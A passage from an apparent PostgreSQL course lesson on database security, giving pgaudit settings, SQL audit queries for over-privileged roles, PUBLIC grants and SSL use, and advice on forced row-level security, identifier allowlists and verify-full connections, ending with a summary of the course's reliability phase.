**Audit:** `pgaudit` with ★ `log_parameter = off` · object auditing via `pgaudit.role` · a ★ `SECURITY DEFINER` trigger so the trail is append-only.

**★ Five audit queries for any system you inherit**
```sql
SELECT rolname FROM pg_roles WHERE rolsuper OR rolcreaterole OR rolbypassrls;
SELECT * FROM information_schema.role_table_grants WHERE grantee='PUBLIC';
-- tenant tables without forced RLS; indexes not leading with tenant_id;
SELECT usename, ssl FROM pg_stat_activity LEFT JOIN pg_stat_ssl USING (pid);
```

**★ The backup key must not live in the database it protects.**

---

## When would I use this at work?

1. **Day one on any multi-tenant system.** Two questions: *does the application own its tables?* and *is RLS forced?* If the answers are yes and no, tenant isolation rests entirely on developers never forgetting a `WHERE` clause — and in the example, 11 of 1,840 queries already had.

2. **Before any penetration test or compliance audit.** The five audit queries take five minutes and find most of what a test will report — over-privileged roles, grants to `PUBLIC`, unforced RLS, plaintext connections.

3. **Whenever a dynamic identifier appears in a query.** `ORDER BY ${...}` and `FROM ${...}` cannot be parameterised, which is precisely why they are where injections now live. An allowlist is three lines.

4. **Reviewing the connection string.** `sslmode=require` looks secure and authenticates nothing. Changing it to `verify-full` is a one-word fix that closed a finding the pen test had already exploited.

---

## Connected topics

**Understand before this:** 65 (pooling — `SET` leakage as a tenant-isolation failure), 64 (backups — key custody and the restore test), 28 (migrations — running as a separate role), 15 (indexes — why RLS needs `tenant_id` leading).

**This unlocks:**
- **Phase 8 (70–76)** — non-relational stores, where most of these controls are weaker or absent
- **77–79** — the capstones, where the security posture is part of the deliverable
- **Case study 15** — multi-tenant SaaS, where RLS is the central design decision

---

> ### ★ PHASE 7 COMPLETE — Reliability & Operations (62–69)
>
> **The arc:** **62** how replication actually works · **63** what happens when a machine dies · **64** what happens when a *human* does · **65** why fewer connections are faster · **66** the bug that makes a healthy database look broken · **67** the method that tells you which of the previous six you have · **68** the vocabulary for the trades you already made · **69** making the database enforce what the application currently only remembers.
>
> **The thread running through all eight:** every one of these failures is *invisible until it isn't*. An inactive replication slot, an untested restore, a pool sized from intuition, an N+1 behind a serialiser, a `SET` leaking through a pooler — none of them raise an error, and all of them are found by a specific query that takes under a minute. **The deliverable of this phase is a set of checks you run before you need them.**
>
> **Next: Phase 8 — Beyond Relational (70–76).** Document, key-value, wide-column, time-series, graph and search stores; when SQL is the wrong shape; and how to run several stores without lying to yourself about consistency.
